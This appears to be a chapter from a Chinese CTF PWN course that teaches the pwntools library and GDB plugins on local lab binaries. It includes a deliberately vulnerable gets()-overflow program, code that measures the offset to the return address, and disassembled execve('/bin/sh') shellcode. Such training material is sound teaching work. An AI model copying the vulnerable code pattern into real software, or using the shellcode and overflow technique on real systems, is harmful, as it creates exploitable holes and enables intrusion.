---
chapter: PWN
section: 工具链：pwntools 与 GDB 插件
order: 305
tags:
  - CTF
  - PWN
  - pwntools
publish: true
---

# P5 pwntools 与 GDB 插件工具链
## Toolchain: pwntools & GDB Plugins

> [!info]- 章节信息
> **所属方向**：PWN ｜ **难度阶段**：L1 筑基期 ｜ **前置要求**：[[P02-前置基础C汇编与Linux|P2]] · [[P04-Linux安全缓解机制|P4]] · [[R06-动态调试GDB与x64dbg|R06]]
> **本章目标**：把 pwntools 从 [[P01-PWN导论与缓解机制全景|P1]] 用过的几个函数扩展成完整的一套——context 全局设定、连接与输入输出、ELF 查询、打包、模式串、shellcode 生成；说清 pwntools 与 GDB 联调的原理和本机可行做法；认识 GDB 插件与 gadget 搜索工具；最后把这一切封装成一份可复用的个人 exploit 模板。

## 1. 本章的工具与演示程序

[[P01-PWN导论与缓解机制全景|P1]] 第 2 节的五步流程里，每一步都点过工具名：checksec 查保护、cyclic 量偏移、pwntools 发 payload、ROPgadget 搜 gadget。本章把这些工具集中讲到位，每个 API 按固定的三段展开：==它是什么、什么时候用、最小用法长什么样==。GDB 本身的命令 [[R06-动态调试GDB与x64dbg|R06]] 已经讲全，本章只在"脚本里嵌 GDB"时用到其中几条（`run`、`info registers`、`x`），不重复。

pwntools 是用 Python 写的漏洞利用开发框架，分两个入口：

- **库**：`from pwn import *` 之后，连接、收发、打包、查符号、汇编、模式串全部是 Python 函数，exploit 就是一个 Python 脚本；
- **命令行**：装 pwntools 时附带一组 `pwn` 开头的子命令，不动 Python 也能完成查保护、生成模式串这类零散操作。

| `pwn` 子命令 | 用途 | 展开位置 |
| ---- | ---- | ---- |
| `pwn checksec 二进制` | 一键查保护机制 | [[P01-PWN导论与缓解机制全景\|P1]] 初用；逐行判读见 [[P04-Linux安全缓解机制\|P4]] |
| `pwn cyclic` | 模式串生成与偏移反查 | 本章第 6 节 |
| `pwn asm` / `pwn disasm` | 汇编 / 反汇编一段字节 | 本章第 7 节 |
| `pwn shellcraft` | 浏览内置 shellcode 模板 | 本章第 7 节 |
| `pwn debug` | 直接把目标程序丢进 GDB | 本章第 8 节 |
| `pwn template` | 生成 exploit 骨架脚本 | 本章第 11 节 |

完整清单用 `pwn -h` 查看，还有 libcdb（查 libc 信息）、elfpatch（改 ELF 字段）等，用到再查。

本章自带一个演示程序，之后各节都在它上面操作——一个与 [[P01-PWN导论与缓解机制全景#5. 实战：从编译到 getshell 的第一个 ret2win|P1 第 5 节]]同型的 `gets` 溢出程序，外加三处为演示准备的常量与 gadget：

```c
/* vuln5.c —— 本章演示用漏洞程序（x86-64 Linux） */
#include <stdio.h>

char *gets(char *s);   /* gets 已移出 C11 标准，手动补声明 */

const char sh[] = "/bin/sh";     /* 常量串，供 ELF 检索演示 */

/* 内联汇编放一段现成 gadget（pop rdi; ret），供 gadget 搜索演示 */
__asm__(
    ".text\n"
    ".globl pop_rdi\n"
    "pop_rdi:\n"
    "    pop %rdi\n"
    "    ret\n"
);

void win(void) {
    puts("[win] called");
}

void vuln(void) {
    char buf[64];
    printf("name> ");
    gets(buf);
}

int main(void) {
    setbuf(stdout, NULL);
    vuln();
    puts("bye");
    return 0;
}
```

编译参数与 [[P01-PWN导论与缓解机制全景#5.1 漏洞程序与编译|P1 5.1]] 相同（关 PIE、关 Canary），链接器照例警告 `gets` 危险、不阻断生成：

```bash
gcc -O0 -fno-pie -no-pie -fno-stack-protector vuln5.c -o vuln5
gcc -O0 -fno-stack-protector vuln5.c -o vuln5_pie   # 保持默认 PIE，第 4 节对照用
gcc -O0 tio.c -o tio                                # tio.c 是第 3 节的输入输出演示程序
```

`tio.c` 打印提示符、读一行回显、再读两个整数打印和，专为演示收发函数编写。三件事先说清：`buf[64]` 溢出到返回地址的偏移是 72（第 8 节会在程序内量一遍）；`win` 无参、打印一行 `[win] called`，充当利用目标；真实赛题不会白送 `pop rdi; ret` 这样的片段，第 10 节会回到这个话题。

## 2. context：一次设定，全局生效

**是什么**：`context` 是 pwntools 的全局配置对象，保存"当前在打什么目标"的约定：架构、位宽、字节序、系统、日志级别。这些值不是某个函数的参数，而是==环境变量式的全局状态==——`p64()`、`flat()`、`asm()`、shellcraft 都从它读取默认行为。

**什么时候设**：脚本开头设一次，全文生效。逐字段设定用赋值；嫌字段多时，第 4 节的 `context.binary` 一行设全。

**最小用法**：

```python
from pwn import *
import pwnlib.term

print('--- defaults ---')
print('arch =', context.arch, ', bits =', context.bits, ', endian =', context.endian)
print('os =', context.os, ', log_level =', logging.getLevelName(context.log_level), ', term_mode =', pwnlib.term.term_mode)
print('flat(0x4011f6) =', flat(0x4011f6).hex())

print('--- context.arch = "amd64" ---')
context.arch = 'amd64'
print('bits =', context.bits, ', bytes =', context.bytes)
print('flat(0x4011f6) =', flat(0x4011f6).hex())

print('--- context.endian = "big" ---')
context.endian = 'big'
print('p64(0x41424344).hex() =', p64(0x41424344).hex())

print('--- context.log_level = "debug" ---')
context.log_level = 'debug'
print('log_level =', logging.getLevelName(context.log_level))
```

输出：

```
--- defaults ---
arch = i386 , bits = 32 , endian = little
os = linux , log_level = INFO , term_mode = False
flat(0x4011f6) = f6114000
--- context.arch = "amd64" ---
bits = 64 , bytes = 8
flat(0x4011f6) = f611400000000000
--- context.endian = "big" ---
p64(0x41424344).hex() = 0000000041424344
--- context.log_level = "debug" ---
log_level = DEBUG
```

逐行读：

- ==不设任何值时按 32 位 x86 处理==：`flat(0x4011f6)` 打出的是 4 字节 `f6114000`。`context.arch = 'amd64'` 之后位宽自动变成 64、打包宽度变成 8 字节，`flat(0x4011f6)` 变成 `f611400000000000`。写 exploit 忘设架构，地址就会一半截一半错位。
- `context.endian = 'big'` 后 `p64` 按大端打包。x86-64 实际是小端（[[02-C语言与内存模型#7.2 大小端|02 章 7.2]]），这一项只在打大端架构（如某些 MIPS 题）时才改。
- `context.arch` 常用值：`amd64`（64 位 x86）、`i386`（32 位 x86）；设架构会自动带上对应的位宽与字节序。
- `context.os` 默认 `linux`，决定 shellcraft 选哪套系统调用的模板，本章不改动它。
- `context.log_level` 控制日志量：`'info'` 显示 `[x]`/`[+]` 进度信息，`'debug'` 把每一次收发的原始字节都打出来。

> [!warning] 脚本第一行先设架构
> `context.arch = 'amd64'`（或第 4 节的 `context.binary = e`）应当是 exploit 脚本里最先执行的语句之一。它影响的不是某一个函数，而是后面所有打包、拼接、汇编的默认行为。

> [!info]- term 模式：pwntools 怎么判断"跑在终端里"
> pwntools 有一个终端增强模式（term 模式）：检测到标准输出接在终端上时，用进度条和彩色日志代替纯文本。判断结果就是上面输出里一闪而过的 `term_mode` 字段，可以读 `pwnlib.term.term_mode` 看到。重定向、管道、被别的脚本调用时是 `False`；在终端里直接运行脚本时是 `True`：
>
> ```bash
> python3 term_demo.py            # term_demo.py 只有一行：print(pwnlib.term.term_mode)
> ```
>
> 输出：
>
> ```
> term_mode = False
> ```
>
> ```bash
> script -qec "python3 term_demo.py" /dev/null   # script 起一个伪终端来跑同一条命令
> ```
>
> 输出：
>
> ```
> term_mode = True
> ```
>
> 第 3 节的 `interactive()` 交互界面依赖终端，管道里跑不出交互效果，根因就在这里。

> [!info]- log_level='debug'：每一次收发的原始记录
> 排查"脚本卡住没收完"时，把日志级别调成 `debug`，pwntools 会把每收到、每发出的字节原样列出：
>
> ```python
> from pwn import *
>
> context.log_level = 'debug'
> io = process('./tio')
> io.recvuntil(b'name> ')
> io.sendline(b'Mars')
> io.recvline()
> io.close()
> ```
>
> 输出：
>
> ```
> [x] Starting local process './tio' argv=[b'./tio']
> [+] Starting local process './tio' argv=[b'./tio'] : pid 539
> [DEBUG] Received 0x6 bytes:
>     b'name> '
> [DEBUG] Sent 0x5 bytes:
>     b'Mars\n'
> [DEBUG] Received 0x23 bytes:
>     b'hello, Mars\n'
>     b'line one\n'
>     b'line two\n'
>     b'sum> '
> [*] Stopped process './tio' (pid 539)
> ```
>
> 注意 `Received 0x23 bytes` 一次列了四行内容：程序在等输入前就把后面的输出全写进了管道，底层一次收到 0x23 字节存进缓冲区；`recvline()` 只是从缓冲区里切出第一行。==debug 日志显示的是底层收发，不是某次 recv 调用拿到的东西==——分清这两层，"明明 recv 了为什么少内容"一类问题就有抓手。

## 3. 连接与输入输出：process、remote 与一套收发函数

**是什么**：`process('./bin')` 把本地程序作为子进程启动并接上它的标准输入输出；`remote('host', port)` 建立 TCP 连接。两者返回同一种对象（pwntools 叫 tube），==收发函数完全共用==——[[P01-PWN导论与缓解机制全景#5.6 第五步：打远程|P1 5.6]]的"改一行从本地切远程"就是建立在这层抽象上。

**什么时候用哪些**：

| 函数 | 行为 |
| ---- | ---- |
| `io.send(data)` | 原样发出 data，不加任何字节 |
| `io.sendline(data)` | 发出 data + 一个换行符 `\n` |
| `io.recv()` | 收"当前已到达"的数据，多少不定；可加 `timeout=秒数` |
| `io.recvline()` | 收到换行符为止，返回含换行的一行 |
| `io.recvuntil(标记)` | 收到指定字节串为止（含标记本身）——最常用的同步手段 |
| `io.recvlines(n)` | 收 n 行，返回列表，每行不含换行符 |
| `io.recvn(n)` | 恰好收 n 个字节 |
| `io.interactive()` | 把连接交给键盘和屏幕，人工交互，Ctrl-C 退出；调通前后手工试探程序行为时用 |
| `io.close()` | 关闭连接 |

==收发的同步靠 `recvuntil` 等提示符==：`recv` 拿到多少取决于时机，`recvuntil` 明确等到目标内容才返回。两个边缘函数一句话：`io.clean(timeout)` 把缓冲区里剩余的数据读走丢弃；`io.unrecv(data)` 把数据塞回收缓冲区，让下一次接收先拿到它（极少用，见下方折叠框）。

**最小用法**（tio.c：打印 `name> ` 读一行回显，再打印两行，最后读两个整数打印和）：

```python
from pwn import *

context.log_level = 'info'

io = process('./tio')
io.recvuntil(b'name> ')
io.sendline(b'Mars')
print('1 recvline   ->', repr(io.recvline()))
print('2 recvlines  ->', io.recvlines(2))
print('3 recvuntil  ->', repr(io.recvuntil(b'sum> ')))
io.send(b'3 4\n')
print('4 recvn      ->', repr(io.recvn(2)))
try:
    print('5 recv       ->', repr(io.recv(timeout=1)))
except EOFError:
    print('5 recv       -> EOFError: 对端已关闭')
io.close()
```

输出：

```
[x] Starting local process './tio'
[+] Starting local process './tio': pid 490
1 recvline   -> b'hello, Mars\n'
2 recvlines  -> [b'line one', b'line two']
3 recvuntil  -> b'sum> '
4 recvn      -> b'7\n'
[*] Process './tio' stopped with exit code 0 (pid 490)
5 recv       -> EOFError: 对端已关闭
```

- `sendline` 与 `send` 的差别就是末尾那个 `\n`：第 4 步用 `send` 时换行符自己补。
- 第 5 步程序已退出，再收就抛 `EOFError`。==EOFError 是 tube 的"对端已关闭"信号==，所有收函数在连接断开后都会抛它；exploit 里常见形态就是"payload 把程序打崩了，下一个 recv 直接 EOF"，[[P01-PWN导论与缓解机制全景#7. 常见问题|P1 常见问题]]记过这个现象。
- `recvline` 返回值带换行符、`recvlines` 不带，拼 flag 前记得 `strip()`（P1 的 exp.py 就是这么写的）。

远程的写法一致。把 `vuln5` 跑成本地 TCP 服务（复用 [[P01-PWN导论与缓解机制全景#5.6 第五步：打远程|P1 5.6]]的 serve.py，换程序与端口），连上去收发：

```python
from pwn import *

context.log_level = 'info'

io = remote('127.0.0.1', 1337)
io.recvuntil(b'name> ')
io.sendline(b'net')
print(io.recvline())
io.close()
```

输出：

```
[x] Opening connection to 127.0.0.1 on port 1337
[x] Opening connection to 127.0.0.1 on port 1337: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 1337: Done
b'bye\n'
[*] Closed connection to 127.0.0.1 port 1337
```

vuln5 不回显输入，收到的 `bye` 是 `main` 里 `puts` 打出的下一行——==连接、等提示符、发送、接收四步在远程一字未改==。把 exploit 完整打过去的用法见第 11 节模板的 REMOTE 模式。

> [!info]- clean 与 unrecv 的行为
> ```python
> io = process('./tio')
> io.unrecv(b'XX')                       # 把 XX 塞回收缓冲区
> print('1 after unrecv  ->', repr(io.recvuntil(b'name> ')))
> io.sendline(b'Mars')
> print('2 recvline      ->', repr(io.recvline()))
> io.clean(0.2)                          # 在 0.2 秒内把缓冲区剩余数据读走丢弃
> io.sendline(b'9 9')
> print('3 after clean   ->', repr(io.recvn(3)))
> io.close()
> ```
>
> 输出：
>
> ```
> 1 after unrecv  -> b'XXname> '
> 2 recvline      -> b'hello, Mars\n'
> 3 after clean   -> b'18\n'
> ```
>
> `unrecv` 后最先读到的是塞回去的 XX；`clean` 把 hello 之后堆积的 `line one`、`line two`、`sum> ` 全部丢弃，下一次接收直接拿到新回复。做循环交互（泄露多次、打多轮）时 `clean` 偶尔用来清场，常规题用不到。

## 4. ELF：把二进制当数据库查

**是什么**：`ELF('./bin')` 把 ELF 文件解析成一个可查询的对象：符号表、PLT、GOT、字符串、基址都能直接取。==手工 nm、objdump 查地址的活，在脚本里一行完成==。

**什么时候用**：写 exploit 的过程中随时要地址——`main` 的地址、`puts` 的 PLT/GOT、`/bin/sh` 字符串的位置。文件在磁盘上就能查，不需要先运行。

**最小用法**：

```python
from pwn import *

context.log_level = 'error'

e = ELF('./vuln5')
print('base      =', hex(e.address))
print('main      =', hex(e.symbols['main']))
print('win       =', hex(e.symbols['win']))
print('puts@plt  =', hex(e.plt['puts']))
print('puts@got  =', hex(e.got['puts']))
print('/bin/sh   =', hex(next(e.search(b'/bin/sh'))))
print('sh symbol =', hex(e.symbols['sh']))

p = ELF('./vuln5_pie')
print('pie base before   =', hex(p.address))
p.address = 0x555555554000
print('pie main  after   =', hex(p.symbols['main']))
```

输出：

```
base      = 0x400000
main      = 0x4011e4
win       = 0x4011a5
puts@plt  = 0x401074
puts@got  = 0x404000
/bin/sh   = 0x402008
sh symbol = 0x402008
pie base before   = 0x0
pie main  after   = 0x555555555201
```

逐项说明：

- `e.address` 是装载基址。no-PIE 程序固定 0x400000（[[P04-Linux安全缓解机制|P4]] 的 PIE 一节讲过这个数）；PIE 程序文件里没有固定基址，==加载前读到的是 0，所有 `symbols`/`plt`/`got` 查出来的其实是相对基址的偏移==。拿到泄露的基址后给 `p.address` 赋值，之后每个查询自动平移——上面把基址设成 0x555555554000，`main` 立即变成 0x555555555201。这个"一步平移全部地址"的写法，是 PIE 题与 [[P07-ret2libc-ret2syscall-ret2shellcode|P7]]的 libc 题的固定步骤。
- `symbols` 查符号表，`plt`/`got` 查两张表。PLT 与 GOT 的延迟绑定机制 [[P03-ELF链接与延迟绑定|P3]] 整章在讲：`puts@plt` 是主程序里的跳板，`puts@got` 是运行时会填上真实地址的槽位。
- `search(字节串)` 在文件里检索字节序列，返回生成器，用 `next()` 取第一个命中。`/bin/sh` 命中 0x402008，与符号 `sh` 的地址一致——源码里它是全局常量数组，符号表留了名字、`.rodata` 留了内容。==程序 strip 过也不影响 search：字节还在文件里，查的就是字节==，只是 `symbols` 那几行换不来地址了（strip 之后怎么定位符号，[[R04-可执行文件格式ELF与PE#2.2 符号已删，地址还在|R04 2.2]] 讲过）。

> [!note] ELF() 的两个常用参数
> `ELF(path, checksec=False)` 关闭加载时的保护机制判读打印（判读本身见 [[P04-Linux安全缓解机制|P4]]）；`ELF(path)` 对动态链接的程序还能配合 `libc.path` 系列 API 做符号匹配，同样放 [[P03-ELF链接与延迟绑定|P3]] 展开。

## 5. packing：数值与字节串的互转

**是什么**：`p64()` 把整数打包成 8 字节、`u64()` 反向解包；`p32()`/`u32()` 是 4 字节版本。地址在 exploit 里到处要以字节串形式拼进 payload，==手写字节序极易搞反，一律走这组函数==（[[P01-PWN导论与缓解机制全景#5.5 第四步：构造利用链|P1 5.5]]已用过 `p64`）。

**什么时候用**：拼 payload 的每一个地址、每一个整数；从泄露数据里解出地址。

**最小用法**：

```python
from pwn import *

context.arch = 'amd64'
print('p64(0x4011f6)   =', p64(0x4011f6))
print('p64().hex()     =', p64(0x4011f6).hex())
print('u64 back        =', hex(u64(p64(0x4011f6))))
print('p32(0xdeadbeef) =', p32(0xdeadbeef))
print('u32 back        =', hex(u32(p32(0xdeadbeef))))
print('p64 big-endian  =', p64(0x4011f6, endianness='big').hex())
print('p32(-2,signed)  =', p32(-2, signed=True).hex())
print('u32 signed back =', u32(b'\xfe\xff\xff\xff', signed=True))
print('flat(...)       =', flat(0x4011f6, 0xdeadbeef, b'AB'))
```

输出：

```
p64(0x4011f6)   = b'\xf6\x11@\x00\x00\x00\x00\x00'
p64().hex()     = f611400000000000
u64 back        = 0x4011f6
p32(0xdeadbeef) = b'\xef\xbe\xad\xde'
u32 back        = 0xdeadbeef
p64 big-endian  = 00000000004011f6
p32(-2,signed)  = feffffff
u32 signed back = -2
flat(...)       = b'\xf6\x11@\x00\x00\x00\x00\x00\xef\xbe\xad\xde\x00\x00\x00\x00AB'
```

- repr 里的 `@` 不是特殊字符：0x40 恰好是可打印字符 `@`，Python 打印字节串时直接显示。
- `endianness` 与 `signed` 两个参数按需给：默认小端、无符号。大端架构或带符号数值才用得上。
- `flat()` 是拼链专用：整数按 context 的位宽自动打包（第 2 节的 amd64 → 8 字节），字节串原样拼接，==一段 `flat(填充, 地址1, 地址2, ...)` 抵十行手工 `+`==。它读取的正是全局 context，所以第 2 节的架构设定直接决定打包宽度。

## 6. cyclic：模式串与偏移

**是什么**：`cyclic(n)` 生成 n 字节模式串，性质是==任意一个同宽度的窗口在整串里位置唯一==；`cyclic_find(值)` 反查某个窗口出现在第几字节。[[P01-PWN导论与缓解机制全景#5.4 第三步：cyclic 算偏移|P1 5.4]]用"生成 200 字节 → 喂进程序 → 从崩溃现场取 8 字节 → 反查"量出了偏移 72，本节把它讲全。

**什么时候用 n=8 / n=16**：模式串默认每 4 字节一组唯一（`n=4`），对应 32 位寄存器宽度。64 位程序的返回地址槽是 8 字节，两种处理都对：沿用 `n=4`，反查时取槽里的前 4 字节（P1 的做法，8 字节整数超过 4 字节表示范围时 pwntools 会提示并按前 4 字节处理）；或生成时就用 `n=8`，==让组宽度和控制槽一样宽，反查值与槽内容一一对应==。`n=16` 用于 16 字节步长的场景，平时少见，会认即可。

**API 最小用法**：

```python
from pwn import *

s = cyclic(40)
print('cyclic(40)          =', s.decode())
print("find b'saaa'        =", cyclic_find(b'saaa'))
print('find 0x6161617461616173 =', cyclic_find(0x6161617461616173))

s8 = cyclic(40, n=8)
print('cyclic(40, n=8)     =', s8.decode())
print("find s8[8:16], n=8  =", cyclic_find(s8[8:16], n=8))
print("find b'caaaaaaa'    =", cyclic_find(b'caaaaaaa', n=8))
```

输出：

```
cyclic(40)          = aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa
find b'saaa'        = 72
[!] cyclic_find() expected an integer argument <= 0xffffffff, you gave 0x6161617461616173
    Unless you specified cyclic(..., n=8), you probably just want the first 4 bytes.
    Truncating the data at 4 bytes.  Specify cyclic_find(..., n=8) to override this.
find 0x6161617461616173 = 72
cyclic(40, n=8)     = aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaa
find s8[8:16], n=8  = 8
find b'caaaaaaa'    = 16
```

- `n=4` 的串是 `aaaabaaacaaad…`（P1 见过的形态），`n=8` 的串是 `aaaaaaaabaaaaaaa…`——字母推进的周期从 4 变成 8。
- 那段 `[!]` 提示值得读一遍：8 字节整数超出 4 字节范围时，pwntools 按"默认 n=4，截取前 4 字节"处理并明说。==提示不是报错==，P1 的 `saaataaa` 正是靠前 4 字节 `saaa` 命中 72。
- `n=8` 时查找值也必须是 8 字节，且取自 `n=8` 的串——用 `n=4` 的串生成的值去配 `n=8` 反查，得到的数字没有意义。

命令行同一套能力（生成、`-n` 指定组宽、`-l` 反查）：

```bash
pwn cyclic 40
```

输出：

```
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa
```

```bash
pwn cyclic -n 8 40
```

输出：

```
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaa
```

```bash
pwn cyclic -l saaa
pwn cyclic -l 0x6161617461616173
```

输出：

```
72
72
```

```bash
pwn cyclic -n 16 -l aaaaaaaaaaaaaaaa
```

输出：

```
0
```

命令行 `-l` 接 4 字节组名或 8/16 字节的十六进制都行，宽度不匹配时按前 `n` 字节命中。

## 7. asm、disasm 与 shellcraft：机器码的生成与阅读

**是什么**：`asm(汇编文本)` 调用 binutils 汇编成字节码，架构取 context；`disasm(字节码)` 反向；`shellcraft` 是内置的 shellcode 模板库，按"架构.系统.功能"组织成属性树，`shellcraft.amd64.linux.sh()` 就是 64 位 Linux 的 getshell 模板。

**什么时候用**：注入类利用需要一段机器码（[[P07-ret2libc-ret2syscall-ret2shellcode|P7]]的 shellcode 路线）；读题目给的 shellcode 或验证自己生成的对不对。

**最小用法**：

```python
from pwn import *

context.arch = 'amd64'
print('asm("nop") =', asm('nop').hex())
print(disasm(asm('push rax; pop rax; ret')))

sc = shellcraft.amd64.linux.sh()
code = asm(sc)
print('shellcode length =', len(code))
print(disasm(code))
```

输出：

```
asm("nop") = 90
   0:   50                      push   rax
   1:   58                      pop    rax
   2:   c3                      ret
---
shellcode length = 48
   0:   6a 68                   push   0x68
   2:   48 b8 2f 62 69 6e 2f 2f 2f 73   movabs rax, 0x732f2f2f6e69622f
   c:   50                      push   rax
   d:   48 89 e7                mov    rdi, rsp
  10:   68 72 69 01 01          push   0x1016972
  15:   81 34 24 01 01 01 01    xor    DWORD PTR [rsp], 0x1010101
  1c:   31 f6                   xor    esi, esi
  1e:   56                      push   rsi
  1f:   6a 08                   push   0x8
  21:   5e                      pop    rsi
  22:   48 01 e6                add    rsi, rsp
  25:   56                      push   rsi
  26:   48 89 e6                mov    rsi, rsp
  29:   31 d2                   xor    edx, edx
  2b:   6a 3b                   push   0x3b
  2d:   58                      pop    rax
  2e:   0f 05                   syscall
```

x86-64 Linux / System V AMD64 ABI，syscall 约定见 [[R03-x86与x64汇编精要复习|R03]]与 [[04-汇编语言精要#10. 系统调用：程序开口找内核办事|04 章 10 节]]。这段 48 字节做的事一条条对得上：`movabs rax, 0x732f2f2f6e69622f` 按小端还原是字符串 `/bin///sh`，压栈后 `rdi` 指向它；中间的 `push 0x1016972` 加 `xor [rsp], 0x1010101` 在栈上拼出零结尾的指针数组，`rsi` 指向它（`execve` 的 argv）；`edx` 清零（envp）；最后 `rax` 装 59（`execve` 的系统调用号）执行 `syscall`。==读 shellcode 就是把每条指令翻译回"给哪个寄存器装了什么"==。

三点说明：

- `asm`/`disasm` 依赖 binutils 对应架构的汇编器，常用 amd64 与 i386 都在默认安装范围内（安装见 [[01-Linux环境与CTF实验环境搭建#5.1 编译与调试|01 章 5.1]]），打其他架构的题时先补对应汇编器；32 位模板换成 `shellcraft.i386.linux.sh()`，同样一步生成（44 字节）。
- `shellcraft` 的模板树在 `pwn import *` 之后直接按属性一路点下去；想浏览全库，用命令行 `pwn shellcraft` 列举。
- 模板生成的字节码里常见 `xor [rsp], 常数` 这类小动作，多数是为了凑出 `\x00` 或避开坏字符——具体为什么这样做，[[P07-ret2libc-ret2syscall-ret2shellcode|P7]]讲 shellcode 时逐条解释。

## 8. pwntools 与 GDB 联动调试

exploit 调到一半需要"停在程序里看看"，这就是联动调试要解决的事。pwntools 给了两个 API：

| API | 行为 | 底层动作 |
| ---- | ---- | ---- |
| `gdb.debug('./bin', gdbscript=脚本)` | 用 GDB 从头启动目标 | 先启动 gdbserver 跑目标，再在一个==新终端==里开 GDB 连上去（日志第一行 `Starting local process '/usr/bin/gdbserver'` 可见） |
| `gdb.attach(io, gdbscript=脚本)` | 附加到已在跑的连接 | 相当于对目标进程执行 `gdb -p PID` |

两个 API 都接收 `gdbscript` 参数：一段 GDB 命令文本，等价于 [[R06-动态调试GDB与x64dbg|R06]]通篇使用的 `gdb -x 命令文件`，只是文件内容直接写在 exploit 脚本里。

**本机的两个障碍**：

1. `gdb.debug` 要"弹一个新终端"。WSL 里没有图形终端程序可弹时，pwntools 打印一行 `running in new terminal` 后把 GDB 放到后台运行——==没有窗口出现，也看不到任何调试界面==，等于没调。
2. `gdb.attach` 走 `gdb -p` 附加，而 WSL 默认内核的 ptrace 限制会拦下对非子进程的附加（[[R06-动态调试GDB与x64dbg#2.1 三种启动方式|R06 2.1]]的 warning）。本机对后台进程附加的输出：

```bash
gdb -q -batch -p 目标PID -ex 'info registers rip'
```

输出（截取）：

```
Could not attach to process.  If your uid matches the uid of the target
process, check the setting of /proc/sys/kernel/yama/ptrace_scope, or try
again as the root user.  For more details, see /etc/sysctl.d/10-ptrace.conf
ptrace: Inappropriate ioctl for device.
```

> [!warning] "Waiting for debugger: Done" 不等于附加成功
> 无终端环境下调用 `gdb.attach`，pwntools 照样打印 `running in new terminal` 和 `Waiting for debugger: Done`——但后台那个 GDB 正是上面这样被 ptrace 拒绝的，屏幕上什么都不会出现。==这个 Done 只说明 pwntools 自己的等待流程走完==，判断附加是否真的成功，要看有没有调试界面、断点有没有命中。

**可行的替代有两条路。**

### 8.1 姿势一：tmux 分屏里跑 gdb.debug（装了 tmux 即可）

`context.terminal` 告诉 pwntools 用哪个终端程序，给它配 `tmux` 的分屏命令，GDB 就开进当前 tmux 会话的分屏里：

```python
#!/usr/bin/env python3
# gdb_tmux.py —— tmux 分屏里跑 gdb.debug
from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']   # 把 GDB 开进 tmux 右半屏
context.log_level = 'info'

io = gdb.debug('./tio', gdbscript='break main\ncontinue\n')
print('gdb session started')
time.sleep(12)
io.close()
```

先 `tmux new -s ctf` 起一个会话，在会话里运行脚本。脚本一方的输出：

```
[x] Starting local process '/usr/bin/gdbserver'
[+] Starting local process '/usr/bin/gdbserver': pid 1210
[*] running in new terminal: ['/usr/bin/gdb', '-q', './tio', '-x', '/tmp/pwnlib-gdbscript-i2yui78i.gdb']
gdb session started
```

与此同时，右半屏里是真正的 GDB（以下为分屏内容截取，分屏较窄、长行有折行）：

```
Breakpoint 1 at 0x615b6acd4215
Reading /usr/lib/x86_64-linux-gnu/libc.
so.6 from remote target...
Breakpoint 1, 0x0000615b6acd4215 in mai
n ()
(gdb)
```

断点命中在 main，`(gdb)` 提示符就绪——==exploit 脚本和调试器同时在位==：脚本的 `io` 管着目标的标准输入输出，GDB 管着断点和寄存器，两边可以同时操作。这条路能走通的原因：目标是 gdbserver 的子进程，父进程跟踪子进程不触发 ptrace_scope 限制；GDB 与 gdbserver 之间走 GDB 远程协议（分屏里的 `Reading … from remote target` 就是它）。地址 0x615b… 是 PIE 程序本次运行的随机基址，每次都不同。

### 8.2 姿势二：脚本生成 gdb 命令文件 + gdb -batch（任何环境可用）

没有 tmux、或想让调试完全脱离终端时，用 R06 的批处理方式，只是命令文件改由 exploit 脚本生成。下面这个脚本完整演示"程序内量偏移"：写 payload 文件 → 生成命令文件 → `gdb -batch` 跑一次 → 从崩溃现场反查偏移：

```python
#!/usr/bin/env python3
# exp_gdb.py —— exploit 脚本里嵌 GDB 批处理调试：程序内量偏移
from pwn import *
import re
import subprocess

context.arch = 'amd64'
context.log_level = 'info'

BIN = './vuln5'

# gdb 命令文件内容：跑一次程序，抓崩溃现场
GDBSCRIPT = '''set confirm off
run < payload.bin
info registers rip rsp
x/gx $rsp
quit
'''
open('payload.bin', 'wb').write(cyclic(200))
open('gdb.cmds', 'w').write(GDBSCRIPT)

out = subprocess.run(
    ['gdb', '-q', '-batch', '-x', 'gdb.cmds', BIN],
    capture_output=True, text=True
).stdout
print(out)

# 从 x/gx $rsp 的输出里取返回地址槽的值，反查偏移
m = re.search(r':\s+(0x[0-9a-f]+)\s*$', out, re.M)
if m:
    slot = int(m.group(1), 16)
    print('return slot =', hex(slot))
    print('offset =', cyclic_find(slot & 0xffffffff))
```

输出：

```
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
name>
Program received signal SIGSEGV, Segmentation fault.
0x00000000004011e3 in vuln ()
rip            0x4011e3            0x4011e3 <vuln+41>
rsp            0x7fffffffe158      0x7fffffffe158
0x7fffffffe158:	0x6161617461616173

return slot = 0x6161617461616173
offset = 72
```

逐段读：

- 崩在 0x4011e3 的 `ret` 上，返回地址槽（rsp 指的位置）里是模式串的 8 字节——与 [[P01-PWN导论与缓解机制全景#5.4 第三步：cyclic 算偏移|P1 5.4]]的崩溃现场同一形状，只是这次整个过程没有人工参与。
- `cyclic_find(slot & 0xffffffff)` 取低 4 字节反查（串是默认 n=4 生成的），得 72。
- ==这套姿势不依赖任何终端、不受 ptrace 限制==：GDB 从头启动目标（父进程调试子进程），脚本只是调用了一次 `gdb -batch`。代价是只有"跑完抓现场"，不能中途交互——要交互，用 8.1 的 tmux 姿势或换台完整 Linux 环境。

第 11 节的模板会把姿势二封装成模板的 `debug()` 函数。

## 9. GDB 插件：pwndbg、gef、peda

R06 第 8 节从逆向视角介绍过三家插件，本章从 exploit 调试视角补一张表。安装方式见 [[01-Linux环境与CTF实验环境搭建#5.2 pwntools 与 GDB 插件|01 章 5.2]]，选一家装即可，本库默认 pwndbg。

| 插件 | 定位 | exploit 调试里最常用的能力 |
| ---- | ---- | ---- |
| pwndbg | PWN 方向使用最广 | 每次停下自动刷出上下文面板：寄存器、栈、反汇编同屏，==返回地址槽里是什么一眼可见==；`search` 按字节搜内存；`vmmap` 列内存映射与权限；`got`/`plt` 直接列两张表；内置 cyclic 与 pwntools 同源 |
| gef | 单文件插件，放进 `~/.gdbinit` 即用 | `checksec`；`pattern create/offset` 模式串；`format-string-helper` 格式化字符串辅助（[[P09-格式化字符串漏洞\|P9]] 会用） |
| peda | 老牌、稳定 | `checksec`；`pattern` 模式串；`xinfo 地址` 显示地址所属模块与偏移 |

